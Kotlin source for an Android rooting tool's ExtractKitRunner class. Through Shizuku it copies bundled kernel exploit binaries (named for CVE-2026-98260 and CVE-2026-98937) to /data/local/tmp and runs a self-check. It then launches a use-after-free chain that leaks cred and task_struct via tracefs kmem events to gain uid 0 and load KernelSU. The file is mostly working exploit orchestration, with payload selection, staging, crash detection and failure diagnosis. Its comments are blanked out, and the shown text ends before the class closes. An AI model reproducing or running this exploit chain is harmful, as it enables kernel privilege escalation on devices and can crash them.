package com.ghostlock.honorfne

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

   
                                                                    
  
                                                   
                                               
                                                              
                                                            
  
                                
                                                               
                                                 
                                                         
                                            
                                                     
   
class ExtractKitRunner(
    private val context: Context,
    private val profileIdx: Int,
    private val profileLabel: String,
    private val log: (String) -> Unit,
    private val status: (String) -> Unit
) {
                                               
    private var bootId: String = ""

       
                
      
                                                          
                                                     
                                                    
                                                       
                                                 
       
                                                         
    private var runningKernel = ""

    private fun latchKey(kernel: String): String? {
        if (profileIdx != SelfAdapt.CUSTOM_PROFILE) return "check_fail_p$profileIdx"
        val cfg = runCatching {
            val a = SelfAdapt.match(context, kernel) ?: return@runCatching null
            SelfAdapt.cfgFor(context, a.key)
        }.getOrNull() ?: return null
        return "check_fail_custom_${cfg.contentHashCode()}"
    }

    companion object {
        private const val WORK = "/data/local/tmp/extract-kit"
        private const val CFG = "$WORK/device.cfg"
        private const val CFG_FALLBACK = "/data/local/tmp/device.cfg"
        private val PAYLOADS = listOf(
            "cve-2026-98260-uid0",
            "cve-2026-98260-android",
            "cve-2026-98937-calib",
            "fam/cve-2026-98260-uid0-5.10",
            "fam/cve-2026-98260-uid0-5.15",
            "fam/cve-2026-98260-uid0-6.1"
        )
    }

       
                                         
      
                                                                 
                                                                   
                                                             
                                              
                                                       
                                         
                                                                
      
                                                           
                                                         
                                                                 
       
    private fun builtinOffsetsOnly(): Boolean {
        if (profileIdx < 0 || profileIdx == SelfAdapt.CUSTOM_PROFILE) return false
        val cfg = EngineCatalog.cfgFor(context, profileIdx) ?: return false
        return java.nio.ByteBuffer.wrap(cfg, 12, 8)
            .order(java.nio.ByteOrder.LITTLE_ENDIAN).long == 0L
    }

       
                                                         
                                                            
                                         
       
    private fun staleCustomCfg(kernel: String): String? {
        if (profileIdx != SelfAdapt.CUSTOM_PROFILE) return null
        val cfg = SelfAdapt.cfgFor(context, EngineCatalog.kernelKey(kernel)) ?: return null
        fun u64(index: Int) = java.nio.ByteBuffer.wrap(cfg, 12 + index * 8, 8)
            .order(java.nio.ByteOrder.LITTLE_ENDIAN).long
        return when {
            u64(16) == 0L -> "k_itimer 尺寸为 0"
            u64(13) == 0L -> "cred 尺寸为 0"
            else -> null
        }
    }

                                                                   
    private fun pickPayload(kernel: String): String {
        val family = SelfAdapt.family(kernel)
        return when (family) {
            "5.10" -> "fam/cve-2026-98260-uid0-5.10"
            "5.15" -> "fam/cve-2026-98260-uid0-5.15"
            "6.1" -> "fam/cve-2026-98260-uid0-6.1"
            else -> {
                if (!SelfAdapt.familySupported(kernel)) {
                    log(
                        "[ek][警告] 内置 payload 没有 $family 分支（只有 5.10 / 5.15 / 6.1 / 6.6 / 6.12），" +
                            "将尝试通用 6.x 版，很可能被 payload 自己的分支守卫拒绝"
                    )
                }
                "cve-2026-98260-uid0"
            }
        }
    }

    suspend fun run(kernel: String) = withContext(Dispatchers.IO) {
        if (!ShizukuController.hasPermission()) {
            log("[ek][错误] Shizuku 未授权，请先连接并授权")
            LogStore.setFatal(
                "Shizuku 未授权，无法提权（点首页「连接 Shizuku」授权）",
                LogStore.RANK_PRECONDITION
            )
            return@withContext
        }
        val probe = ShizukuController.shellProbe()
        if (!ShizukuController.probeOk(probe)) {
            log("[ek][错误] Shizuku 命令通道失效（code=${probe.code} ${probe.err.trim()}）")
            LogStore.setFatal(
                "Shizuku 命令通道失效，请重新连接后再提权",
                LogStore.RANK_PRECONDITION
            )
            status("Shizuku 命令通道失效，请重新连接")
            return@withContext
        }

        status("ExtractKit 链：98260 → KernelSU late-load")
        
        
        
        
        if (builtinOffsetsOnly()) {
            log("==== 链路 B：ExtractKit CVE-2026-98260（profile #$profileIdx $profileLabel）====")
            log("[ek] 内核：$kernel")
            log("[ek][跳过] device.cfg 里 do_timer_create=0，payload 会强制 offsets-only：")
            log("[ek][跳过] ① 基址校准只剩页配对兜底，恒为 candidates=0 → check 必然 NOT_READY")
            log("[ek][跳过] ② fake_stage 被置 0，KSU late-load 主链不会执行")
            log("[ek][跳过] 因此不再下发物料、不再空跑自检；换 profile/重试都不会变")
            LogStore.setFatal(
                "这颗内核只收录了结构偏移（offsets-only）profile #$profileIdx，" +
                    "payload 缺少内核 text 符号（do_timer_create），链路 B 跑不通；" +
                    "请在工具页「自助适配」导入本机 boot.img 生成带符号的 profile，再点一键 Root",
                LogStore.RANK_RESULT
            )
            status("该内核需先「自助适配」（导入本机 boot.img）")
            return@withContext
        }
        val staleCfg = staleCustomCfg(kernel)
        if (staleCfg != null) {
            log("[ek][跳过] 本机自助适配 profile 的 $staleCfg，自检即使 READY 也无法拿到 cred")
            log("[ek][跳过] 这是旧版生成的残留 cfg；请重新导入本机 boot.img（新版会拒绝生成残缺 cfg）")
            LogStore.setFatal(
                "自助适配 profile 残缺（$staleCfg），链路 B 无法拿到 cred；请重新导入本机 boot.img 重新适配",
                LogStore.RANK_RESULT
            )
            status("自助适配 profile 残缺，请重新导入 boot.img")
            return@withContext
        }
        
        LogStore.clearFatalIfStartsWith("Shizuku")
        LogStore.setProgress("正在提权，结果出来后会写在这里")
        val who = if (profileIdx == SelfAdapt.CUSTOM_PROFILE) "自助适配 profile"
        else "profile #$profileIdx"
        log("==== 链路 B：ExtractKit CVE-2026-98260（$who $profileLabel）====")
        log("[ek] 内核：$kernel")
        LogStore.sync(force = true, reason = "开始链路 B 提权")

        runningKernel = kernel
        val boot = ShizukuController.exec(
            "cat /proc/sys/kernel/random/boot_id 2>/dev/null", 10_000
        ).out.trim()
        val prefs = context.getSharedPreferences("extractkit", Context.MODE_PRIVATE)
        bootId = boot
        
        
        
        
        val latchLabel = if (profileIdx == SelfAdapt.CUSTOM_PROFILE) "自助适配 profile"
                         else "profile #$profileIdx"
        val latchK = latchKey(kernel)
        if (latchK != null && boot.isNotBlank()) {
            val latch = prefs.getString(latchK, null)
            if (latch != null && latch.startsWith("$boot|")) {
                val why = latch.substringAfter('|')
                log("[ek][判定] 本次开机（${boot.take(8)}）用 $latchLabel 已判定失败过；内核与 cfg 都没变，重跑结果相同")
                log("[ek][判定] 上次结论：$why")
                log("[ek][判定] 重启设备，或重新导入 boot.img 生成新 profile 后自动解除，不必再点")
                LogStore.setFatal(
                    "本次开机已判定不可用：$why（重启或重导 boot.img 后才可能变化）",
                    LogStore.RANK_RESULT
                )
                status("本次开机已判定不可用，重启或重导 boot.img 后再试")
                return@withContext
            }
        }
        if (boot.isNotBlank() && prefs.getString("last_ok_boot", null) == boot) {
            log("[ek][提示] 本次开机已成功过一次。UAF 是一次性资源，重复运行会写已释放槽位")
            log("[ek] 如需重试请先重启设备（重启后 boot_id 会变）")
            LogStore.setFatal("无（本次开机已临时 Root 成功，重启后可再跑）", LogStore.RANK_RESULT)
            status("本次开机已提权成功，重启后可再跑")
            return@withContext
        }

        if (isRooted()) {
            log("[ek] 设备当前已是 root，跳过提权")
            LogStore.setFatal("无（设备当前已有临时 Root，KernelSU 已就绪）", LogStore.RANK_RESULT)
            status("KernelSU 已就绪，临时 root 成功！")
            return@withContext
        }

        
        
        
        
        
        
        
        
        val tf = EnvProbe.tracefs()
        tf.detail.forEach { log("[ek][tracefs] ${it.take(150)}") }
        log("[ek][tracefs] ${tf.summary}")
        if (!tf.usable) {
            log(
                "[ek][tracefs][提示] shell 直接写 enable/trigger 被拒，但 payload 自检另有" +
                    "开法；继续下发并跑 check 复核（最多 25 秒），以 check 结论为准"
            )
        }

        
        
        
        val deadKey = deadKernelKey(kernel)
        val dead = prefs.getString(deadKey, null)
        if (dead != null) {
            if (tf.usable) {
                prefs.edit().remove(deadKey).apply()
                log("[ek][判定] 该内核曾判定链路 B 不可用，但本次 tracefs 预检可写 → 自动解除，继续尝试")
            } else {
                log("[ek][判定] 该内核已确认链路 B 结构性不可用（tracefs 预检仍不可写），本轮不再下发 payload")
                log("[ek][判定] 上次结论：$dead")
                log("[ek][提示] 重导 boot.img 只会换 cfg，改不了内核的 tracefs 权限；" +
                        "系统/内核更新后内核串变化，此记录自动失效")
                LogStore.setFatal(
                    "链路 B 不可用：该内核禁止 shell 开启 kmem 事件（tracefs 仅 root 可写）",
                    LogStore.RANK_RESULT
                )
                status("该内核不支持链路 B，无需重试")
                return@withContext
            }
        }

        if (!deploy(kernel)) return@withContext
        val payload = pickPayload(kernel)
        log("[ek] 选用 payload：$payload")

        if (!selfCheck(payload, quick = !tf.usable, tfNote = tf.summary.takeIf { !tf.usable })) {
            
            
            log("[ek][中止] 只读自检未通过，不会硬上主链（官方 chain_uid0 同款约束）")
            status("自检未通过，已中止")
            return@withContext
        }

        val res = runFake(payload, boot)
        if (res.ok) {
            if (boot.isNotBlank()) prefs.edit().putString("last_ok_boot", boot).apply()
            log("[ek] ✔ 已确认 uid=0；exploit 进程需驻留，请勿 kill，清理只能重启")
            LogStore.setFatal("无（临时 Root 成功，KernelSU 已就绪）", LogStore.RANK_RESULT)
            status("ExtractKit 提权成功，临时 root 可用！")
        } else {
            log("[ek][失败] ${res.reason}")
            LogStore.setFatal("本轮未成功：${res.reason}", LogStore.RANK_RESULT)
            status("未拿到 root：${res.reason}")
            
            
            
            
            val k = latchKey(kernel)
            if (k != null && boot.isNotBlank()) {
                prefs.edit().putString(k, "$boot|${res.reason}").apply()
            }
        }
    }

                                                
    private suspend fun deploy(kernel: String): Boolean = withContext(Dispatchers.IO) {
        log("[ek][deploy] 下发 payload 与 device.cfg 到 $WORK …")

        
        
        if (!ensureWorkDirWritable()) {
            LogStore.setFatal("提权下发失败：$WORK 目录不可写，且自动重建未成功")
            return@withContext false
        }

        for (p in PAYLOADS) {
            val data = runCatching {
                context.assets.open("extractkit/payload/$p").use { it.readBytes() }
            }.getOrNull()
            if (data == null) {
                log("[ek][deploy][错误] 读取 assets/extractkit/payload/$p 失败（资产缺失或无法打开）")
                LogStore.setFatal("提权下发失败：内置 payload 资产 $p 读取失败")
                return@withContext false
            }
            val outcome = ShizukuController.writeFileDetailed(data, "$WORK/$p")
            if (outcome.ok) {
                ShizukuController.exec("chmod 755 $WORK/$p", 15_000)
                log("[ek][deploy] $p (${data.size} bytes) ✔")
            } else {
                
                log("[ek][deploy][错误] ${outcome.diagnostic()}")
                if (ShizukuController.channelDead(
                        ShizukuController.ExecResult(outcome.code, "", outcome.err)
                    )) {
                    log("[ek][deploy][错误] Shizuku 命令通道已断（非文件问题），请重新连接 Shizuku")
                    LogStore.setFatal("提权下发失败：Shizuku 命令通道中断，请重新连接")
                } else {
                    LogStore.setFatal("提权下发失败：无法写入 $p，详见日志诊断")
                }
                return@withContext false
            }
        }

        
        
        val cfg: ByteArray?
        val cfgFrom: String
        if (profileIdx == SelfAdapt.CUSTOM_PROFILE) {
            val hit = SelfAdapt.match(context, kernel)
            cfg = hit?.let { SelfAdapt.cfgFor(context, it.key) }
            cfgFrom = "自助适配（${hit?.release ?: "未命中"}）"
        } else {
            cfg = EngineCatalog.cfgFor(context, profileIdx)
            cfgFrom = "内置 profile #$profileIdx"
        }
        if (cfg == null) {
            log("[ek][deploy][错误] $cfgFrom 的 device.cfg 取不到（magic/size 异常）")
            return@withContext false
        }
        val w1 = ShizukuController.writeFileDetailed(cfg, CFG)
        if (!w1.ok) {
            log("[ek][deploy][错误] device.cfg 主路径下发失败：${w1.diagnostic()}（来源：$cfgFrom）")
            LogStore.setFatal("提权下发失败：device.cfg 写入失败，详见日志诊断")
            return@withContext false
        }
        
        
        
        val w2 = ShizukuController.writeFileDetailed(cfg, CFG_FALLBACK)
        if (w2.ok) {
            log("[ek][deploy] device.cfg ${cfg.size} B 已写 $CFG 与 $CFG_FALLBACK（来源：$cfgFrom）")
        } else {
            log("[ek][deploy][警告] 备用 cfg 写入失败（主路径已就绪，继续）：${w2.diagnostic()}")
        }

        
        
        
        
        
        
        
        val mgrPkg = ManagerCatalog.OFFICIAL_PKG
        val chosen = ManagerSelection.selected(context)
        log("[ek][deploy] ksud 来源管理器：$mgrPkg（与内置 kernelsu.ko 配套）")
        if (chosen != mgrPkg) {
            log("[ek][deploy] 工作台当前选择 $chosen 属第三方分支，不参与 ksud 部署" +
                    "（其签名不在内置模块的信任列表里）")
        }
        val mgr = ShizukuController.exec("pm path $mgrPkg", 15_000)
        if (mgr.out.isBlank()) {
            log("[ek][deploy] 未检测到 KernelSU 管理器，安装内置 v3.3.0 …")
            val apk = runCatching {
                context.assets.open("managers/KernelSU-manager.apk").use { it.readBytes() }
            }.getOrNull()
            if (apk == null) {
                log("[ek][deploy][错误] 内置管理器 APK 读取失败")
                return@withContext false
            }
            val dst = "/data/local/tmp/managers/KernelSU-manager.apk"
            if (ShizukuController.writeFile(apk, dst)) {
                val r = ShizukuController.exec("pm install -r $dst", 180_000)
                log("[ek][deploy] pm install rc=${r.code} ${(r.out + r.err).trim().take(200)}")
            }
        } else {
            log("[ek][deploy] 管理器已安装：$mgrPkg")
        }

        
        val check = ShizukuController.exec(
            "test -s $CFG && test -x $WORK/cve-2026-98260-uid0 && echo EK_DEPLOY_OK",
            20_000
        )
        val ok = check.code == 0 && check.out.contains("EK_DEPLOY_OK")
        if (ok) {
            log("[ek][deploy] 完成并校验通过 ✔")
        } else {
            
            val stat = ShizukuController.exec(
                "ls -l $CFG $CFG_FALLBACK $WORK/cve-2026-98260-uid0 2>&1; " +
                    "echo ---; getenforce 2>&1", 15_000
            )
            log("[ek][deploy][错误] 关键文件复检失败（code=${check.code}, out=${check.out.trim()}, " +
                "err=${check.err.trim()}）；现场：${stat.out.trim().take(400)}")
            LogStore.setFatal("提权下发失败：payload/配置复检未通过，详见日志现场")
        }
        return@withContext ok
    }

       
                                                         
                                                             
                                    
       
    private suspend fun ensureWorkDirWritable(): Boolean {
        
        val probe = ShizukuController.shellProbe()
        if (!ShizukuController.probeOk(probe)) {
            log("[ek][deploy][错误] 命令通道探测失败（code=${probe.code} err=${probe.err.trim()}）")
            return false
        }
        val mk = ShizukuController.exec("mkdir -p $WORK/fam /data/local/tmp/managers 2>&1", 15_000)
        log("[ek][deploy] 目录准备 code=${mk.code} ${mk.out.trim().take(120)}")

        
        
        
        suspend fun state(): String = ShizukuController.exec(
            "if [ ! -d '$WORK' ]; then echo MISSING; " +
                "elif [ ! -w '$WORK' ]; then echo READONLY; " +
                "else rm -rf '$WORK'/cve-* '$WORK'/fam/* 2>/dev/null; " +
                "rm -f '$WORK/device.cfg' 2>/dev/null; " +
                "if printf x > '$WORK/cve-2026-98260-uid0' 2>/dev/null; then " +
                "rm -f '$WORK/cve-2026-98260-uid0'; echo WRITABLE; else echo BLOCKED; fi; fi",
            10_000
        ).out.trim()

        var st = state()
        log("[ek][deploy] 工作目录探测：$st（$WORK）")
        if (st == "WRITABLE") return true

        val rotated = "$WORK.old.${System.currentTimeMillis()}"
        log("[ek][deploy][警告] 工作目录 $st，尝试轮换后重建：$rotated")
        ShizukuController.exec(
            "mv '$WORK' '$rotated' 2>/dev/null; rm -rf '$WORK' 2>/dev/null; " +
                "mkdir -p '$WORK/fam' && chmod 771 '$WORK' && echo REBUILT", 15_000
        )
        st = state()
        if (st == "WRITABLE") {
            log("[ek][deploy] 目录重建后已可写 ✔")
            return true
        }

        val ls = ShizukuController.exec("ls -ld '$WORK' '$WORK/cve-2026-98260-uid0' 2>&1", 8_000)
        log("[ek][deploy][错误] 目录重建后仍不可用：$st；现场：${ls.out.replace("\n", " | ").take(220)}")
        LogStore.setFatal(
            "提权下发失败：$WORK 内无法创建 payload（$st），可能有 root 残留文件；重启设备后再试",
            LogStore.RANK_RESULT
        )
        return false
    }

       
                                                   
      
                                                       
                                                     
                                   
                                       
       
    private suspend fun selfCheck(
        payload: String,
        quick: Boolean = false,
        tfNote: String? = null
    ): Boolean {
        val budget = if (quick) 25 else 90
        log("[ek][check] 只读自检 ./$payload check（出现结论立即返回，最长 ${budget}s）…")
        
        
        
        
        ShizukuController.exec(
            "rm -f $WORK/check.log; " +
                "stat -c %s /data/local/tmp/cve-2026-98260.log 2>/dev/null > $WORK/.logoff; " +
                "[ -s $WORK/.logoff ] || echo 0 > $WORK/.logoff; " +
                
                
                
                "( cd $WORK && EXTRACTKIT_MGR=${ManagerCatalog.OFFICIAL_PKG} " +
                "./$payload check > $WORK/check.log 2>&1 </dev/null ) " +
                ">/dev/null 2>&1 &",
            15_000
        )
        val started = System.currentTimeMillis()
        repeat(budget / 2) {
            delay(2_000)
            val t = ShizukuController.exec("tail -n 60 $WORK/check.log 2>/dev/null", 8_000)
            val out = t.out
            if (out.contains("[check] READY")) {
                log("[ek][check] ✔ 自检通过（[check] READY，${elapsed(started)}s）")
                return true
            }
            
            
            if (out.contains("[check] tracefs=no")) {
                log("[ek][check] payload 自报 tracefs 不可写（${elapsed(started)}s），立即收尾")
                return reportCheckFailure(tfNote)
            }
            if (out.contains("[check] NOT_READY") || out.contains("CHAIN_STOP")) {
                log("[ek][check] 自检已给出结论（${elapsed(started)}s），不再空等")
                return reportCheckFailure(tfNote)
            }
        }
        log("[ek][check] ${budget} 秒内没有出现 READY / NOT_READY，按失败处理")
        return reportCheckFailure(tfNote)
    }

    private fun elapsed(start: Long): Long = (System.currentTimeMillis() - start) / 1000

       
                              
      
                                                                       
                                                          
                                                   
                                               
       
    private suspend fun payloadLogDelta(): String? {
        val off = ShizukuController.exec("cat $WORK/.logoff 2>/dev/null", 8_000)
            .out.trim().toLongOrNull() ?: return null
        val r = ShizukuController.exec(
            "tail -c +${off + 1} /data/local/tmp/cve-2026-98260.log 2>/dev/null | tail -n 60",
            12_000
        )
        val out = r.out
        if (!out.contains("[check]") && !out.contains("[base]")) return null
        return out
    }

       
                                       
      
                                            
                             
       
    private suspend fun reportCheckFailure(tfNote: String? = null): Boolean {
        val delta = payloadLogDelta()
        val lines: List<String>
        if (delta != null) {
            lines = delta.lines().map { it.trim() }.filter { it.isNotEmpty() }
            log("[ek][check][来源] payload 自有日志（本轮增量 ${lines.size} 行，未经筛选）")
        } else {
            val diag = ShizukuController.exec(
                "grep -E '^\\[(check|cfg|slab|lay|base|probe)\\]|^\\[trace\\]' " +
                    "$WORK/check.log 2>/dev/null | tail -n 40",
                10_000
            )
            lines = diag.out.lines().map { it.trim() }.filter { it.isNotEmpty() }
        }
        if (lines.isEmpty()) {
            log("[ek][check][结论] check.log 与 payload 日志里都没有输出，payload 可能没跑起来")
            LogStore.setFatal(
                "链路 B 自检没有输出：payload 未启动（物料缺失或被分支守卫拒绝）",
                LogStore.RANK_RESULT
            )
            return false
        }
        lines.takeLast(45).forEach { log("[ek][check] ${it.take(170)}") }
        val all = lines.joinToString("\n")
        
        fun num(re: Regex): Int? = re.find(all)?.groupValues?.get(1)?.toIntOrNull()
        val enableOk = num(Regex("""\[trace\] enable ok=(\d+)"""))
        val enableFail = num(Regex("""\[trace\] enable fail=(\d+)"""))
        val enableTotal = if (enableOk != null && enableFail != null) enableOk + enableFail else null
        val recs = num(Regex("""\[base\] recs=(\d+)"""))
        
        
        val evCand = num(Regex("""\[trace\] kmem 事件候选 (\d+) 个"""))
        val baseZero = all.contains("[check] base=0")      
        val layFallback = all.contains("读不到 events/kmem/*/format")
        
        
        val cfgNoTimer = builtinOffsetsOnly()
        
        
        
        
        
        
        val kmemBlocked = enableOk != null && enableFail != null &&
            enableFail >= 5 && enableOk <= 1 && recs == 0
        val cause = when {
            all.contains("[check] tracefs=no") -> "tracefs 不可写（tracefs=no）"
            enableOk == 0 -> "kmem 事件全部被拒（enable ok=0），payload 拿不到任何 trace 记录"
            kmemBlocked -> "kmem 事件开启只成功 $enableOk/$enableTotal 次（$enableFail 次被拒），" +
                "唯一成功的不是 kmem 事件；该内核把 events/kmem 的 enable/trigger 限制为 root-only，" +
                "payload 以 uid 2000 无法开启，链路 B 在本机不可用"
            
            
            baseZero && recs == 0 && all.contains("self_enable=0") ->
                "kmem 事件没能真正打开（holder self_enable=0），payload 抓不到任何记录（base=0）"
            baseZero && recs == 0 -> "已装 ${enableOk ?: "?"} 条开事件规则，但一条记录都没抓到（base=0" +
                (if (evCand != null && evCand < 4)
                    "；本机只暴露 $evCand 个 kmem 事件候选，payload 只认 kmem_cache_alloc*/kmem_cache_free/mm_page_*"
                else "") + "）"
            baseZero && (recs ?: 0) > 0 -> "抓到 $recs 条记录却解析不出基址（base=0" +
                when {
                    
                    
                    cfgNoTimer -> "，device.cfg 没有内核 text 符号，call_site 校准无路可走"
                    layFallback -> "，事件 format 读不到、按固定偏移解析失败"
                    else -> ""
                } + "）"
            baseZero && evCand != null && evCand < 4 ->
                "本机只暴露 $evCand 个 kmem 事件候选（payload 只认 kmem_cache_alloc*/" +
                    "kmem_cache_free/mm_page_*），采集不到足够记录，基址校准无从下手（base=0）"
            all.contains("CHAIN_STOP:no_trace_records") -> "tracefs 没有产生任何 kmem 记录"
            all.contains("CHAIN_STOP") -> "主链前置条件不满足（CHAIN_STOP）"
            baseZero -> "内核基址标定为 0（base=0）"
            else -> "自检未输出 READY"
        }
        log("[ek][check][结论] $cause")
        
        
        val short = tfNote?.let {
            "；tracefs 直写 enable=deny（预检），payload 侧已开事件 ${enableOk ?: "?"} 个"
        } ?: ""
        val prefs = context.getSharedPreferences("extractkit", Context.MODE_PRIVATE)
        
        
        val k = latchKey(runningKernel)
        if (bootId.isNotBlank() && k != null) {
            prefs.edit().putString(k, "$bootId|$cause").apply()
        }
        
        
        
        if (kmemBlocked && runningKernel.isNotBlank()) {
            prefs.edit().putString(deadKernelKey(runningKernel), cause).apply()
            log("[ek][判定] 已按内核记下「链路 B 结构性不可用」；重导 boot.img 不会解除，需系统/内核更新")
        }
        LogStore.setFatal(
            if (kmemBlocked) "链路 B 不可用：该内核禁止 shell 开启 kmem 事件（tracefs 仅 root 可写）"
            else "链路 B 自检未通过：$cause$short",
            LogStore.RANK_RESULT
        )
        return false
    }

                                                   
    private fun deadKernelKey(kernel: String): String =
        "dead_kernel_${kernel.trim().hashCode()}"

                                         
    private data class FakeOutcome(val ok: Boolean, val reason: String)

    private data class FakeProbe(val count: Int?, val tail: String, val boot: String, val lost: Boolean)

       
                                               
      
                                                           
                                               
                                           
       
    private suspend fun fakeProbe(): FakeProbe {
        val r = ShizukuController.exec(
            "pidof 'cve-2026-98260-' 2>/dev/null | wc -w; " +
                "cat /proc/sys/kernel/random/boot_id 2>/dev/null; " +
                "tail -n 25 $WORK/fake.log 2>/dev/null",
            12_000
        )
        if (ShizukuController.channelDead(r)) return FakeProbe(null, "", "", true)
        val lines = r.out.lines()
        val count = lines.getOrNull(0)?.trim()?.toIntOrNull()
        val boot = lines.getOrNull(1)?.trim().orEmpty()
        val tail = lines.drop(2).joinToString("\n")
        val lost = count == null && boot.isBlank() && tail.isBlank()
        return FakeProbe(count, tail, boot, lost)
    }

       
                                          
      
                                                           
                                                    
                                                   
                                                        
       
    private suspend fun runFake(payload: String, bootAtStart: String): FakeOutcome {
        log("[ek][fake] 启动主链（成功后进程驻留，最长观察 420s）…")
        ShizukuController.exec(
            "rm -f $WORK/fake.log; " +
                
                
                
                "( cd $WORK && EXTRACTKIT_MGR=${ManagerCatalog.OFFICIAL_PKG} ./$payload fake " +
                "> $WORK/fake.log 2>&1 </dev/null ) >/dev/null 2>&1 &",
            15_000
        )
        val deadline = System.currentTimeMillis() + 420_000
        var ticks = 0
        var markerSeen = false
        var doneSeen = 0
        var deadTicks = 0
        while (System.currentTimeMillis() < deadline) {
            delay(10_000)
            ticks++
            val probe = fakeProbe()
            if (probe.lost) {
                log("[ek][fake][结论] 命令通道没有任何返回，无法继续观察")
                return FakeOutcome(false, "观察主链时 Shizuku 通道失效，无法确认结果")
            }
            if (bootAtStart.isNotBlank() && probe.boot.isNotBlank() && probe.boot != bootAtStart) {
                log(
                    "[ek][fake][结论] 开机标识已变化" +
                        "（${bootAtStart.take(8)} → ${probe.boot.take(8)}），设备在内核崩溃后重启"
                )
                return FakeOutcome(false, "主链把内核打崩，设备已重启（本次开机标识已变化）")
            }
            val s = probe.tail
            if (!markerSeen && (s.contains("KSU_LOADED") || s.contains("late-load rc=0") ||
                    s.contains("child report uid=0"))) {
                markerSeen = true
                log("[ek][fake] 命中成功标记（${(ticks * 10)}s），继续确认 uid=0 …")
            }
            if (markerSeen && isRooted()) return FakeOutcome(true, "uid=0 已确认")
            
            
            if (s.contains("[+] done")) {
                doneSeen++
                if (doneSeen >= 2 && !isRooted()) {
                    log("[ek][fake][结论] payload 已打印 done 但 uid 仍不是 0")
                    return FakeOutcome(false, "payload 跑完但 uid 仍不是 0（详见 fake.log）")
                }
            } else {
                doneSeen = 0
            }
            if (s.contains("[guard] payload built for") || s.contains("refusing to run")) {
                log("[ek][fake][中止] payload 分支守卫拒绝运行（选错内核分支）")
                return FakeOutcome(false, "payload 分支守卫拒绝运行（profile 与内核不匹配）")
            }
            
            
            
            
            if (!markerSeen) {
                val terminal = when {
                    s.contains("[-] cred leak failed") -> credFailDetail()
                    s.contains("[!] child task not leaked") -> taskFailDetail()
                    s.contains("CHAIN_STOP:") ->
                        "payload 前置条件不满足（${s.substringAfter("CHAIN_STOP:").take(40)}）"
                    else -> null
                }
                if (terminal != null) {
                    log("[ek][fake][结论] $terminal（${ticks * 10}s，不再等满 420s）")
                    return FakeOutcome(false, terminal)
                }
            }
            
            
            val cnt = probe.count
            if (cnt == 0) {
                deadTicks++
                if (deadTicks >= 3) {
                    val tail = s.replace('\n', ' ').takeLast(220).trim()
                    log("[ek][fake][结论] payload 进程已连续 30s 不存在，日志尾：${tail.ifBlank { "（空）" }}")
                    return FakeOutcome(
                        false,
                        "payload 进程已退出，未出现 root 标记" +
                            (if (tail.isBlank()) "（fake.log 为空）" else "（尾部已写入日志）")
                    )
                }
            } else {
                deadTicks = 0
            }
            if (ticks % 6 == 0) {
                log("[ek][fake] 运行中 ${ticks * 10}s，日志尾：${s.replace("\n", " | ").takeLast(180).trim()}")
            }
        }
        val tail = ShizukuController.exec(
            "tail -n 30 $WORK/fake.log 2>/dev/null; " +
                "tail -n 15 /data/local/tmp/ksu_stage.out 2>/dev/null",
            15_000
        )
        log("[ek][fake] 超时尾部：${tail.out.replace("\n", " | ").take(900).trim()}")
        return if (isRooted()) FakeOutcome(true, "uid=0 已确认")
        else FakeOutcome(false, "等满 420 秒仍无 root 标记")
    }

       
                                                            
      
                                                                
                                                             
                                                             
                                                                     
                                                
      
                                                                  
                                                          
       
    private suspend fun credFailDetail(): String {
        val diag = ShizukuController.exec(
            "grep -E '^\\[base\\] sample|^\\[cred\\] sizes|^\\[trace\\] kmem 事件候选' " +
                "$WORK/fake.log 2>/dev/null | tail -n 8",
            10_000
        ).out
        
        val actualId = Regex("""\bid=(\d+)""").find(diag)?.groupValues?.get(1)?.toIntOrNull()
        val cfgEv0 = runCatching {
            val c = EngineCatalog.cfgFor(context, profileIdx) ?: return@runCatching null
            if (c.size < 336) return@runCatching null
            
            (c[316].toInt() and 0xFF) or
                ((c[317].toInt() and 0xFF) shl 8) or
                ((c[318].toInt() and 0xFF) shl 16) or
                ((c[319].toInt() and 0xFF) shl 24)
        }.getOrNull()
        val idMismatch = actualId != null && cfgEv0 != null && actualId != cfgEv0
        log("[ek][fake][判因] 事件 id：cfg=$cfgEv0 / 内核实际=$actualId" +
            (if (idMismatch) "（错配）" else "（一致）"))
        return when {
            idMismatch -> "cred 泄漏失败：profile 事件 id 配置 $cfgEv0，" +
                "但本机 kmem_cache_alloc 实际 id=$actualId（错配导致 cred 记录被误判为释放）"
            s_credSizesEmpty(diag) -> "cred 泄漏失败：trace 抓到记录但 cred 尺寸类为空" +
                "（该内核 cred 走 alloc_node 变体，payload 事件白名单未覆盖）"
            else -> "cred 泄漏失败：cred 站点/尺寸与 profile 不符" +
                (if (actualId != null) "（实际事件 id=$actualId）" else "")
        }
    }

       
                                              
      
                                                     
                                                              
                                                          
                                                                    
                                                                  
                                                                  
      
                                                
       
    private suspend fun taskFailDetail(): String {
        val diag = ShizukuController.exec(
            "grep -E 'cred site|site-hit|cache sizes|task_struct objsize|kmem_cache_alloc_node enable' " +
                "$WORK/fake.log 2>/dev/null | tail -n 12",
            10_000
        ).out
        val siteMismatch = Regex("""cred site (0x[0-9a-f]+) != (0x[0-9a-f]+)""")
            .find(diag)?.let { "${it.groupValues[1]}（cfg=${it.groupValues[2]}）" }
        val siteHitZero = diag.contains("site-hit") && Regex("""site-hit.*total=0""").containsMatchIn(diag)
        val taskObj = Regex("""task_struct objsize=(0x[0-9a-f]+)""")
            .find(diag)?.groupValues?.get(1)
        val sizesLine = diag.lineSequence().firstOrNull { it.contains("cache sizes") }
        val taskAbsent = taskObj != null && sizesLine != null && !sizesLine.contains(taskObj)
        val allocNodeOff = diag.contains("kmem_cache_alloc_node enable=-1")

        log("[ek][fake][判因] cred site=${siteMismatch ?: "一致"}；" +
            "site-hit total=0=$siteHitZero；task $taskObj 在 cache sizes 中缺失=$taskAbsent；" +
            "alloc_node enable=-1=$allocNodeOff")

        return when {
            taskAbsent -> "task_struct 分配事件未被 trace 抓到（objsize $taskObj 不在事件记录里）" +
                (if (allocNodeOff) "：该内核走 kmem_cache_alloc_node 变体，未开对应事件" else "") +
                (if (siteMismatch != null) "；且 cred 站点 $siteMismatch 与 cfg 不符" else "") +
                "；重试不会变，需换支持该内核的方案"
            siteMismatch != null && siteHitZero ->
                "cred 站点标定不符（实际 $siteMismatch），site-hit 0 条；" +
                    "task_struct 未能定位，重试不会变"
            else -> "子进程 task_struct 没有泄漏（trace 未抓到其分配记录）"
        }
    }

    private fun s_credSizesEmpty(diag: String): Boolean {
        val line = diag.lineSequence().firstOrNull { it.contains("[cred] sizes") } ?: return false
        val body = line.substringAfter("[cred] sizes").trim()
        return body.startsWith("(0)") || body.contains("(0):")
    }

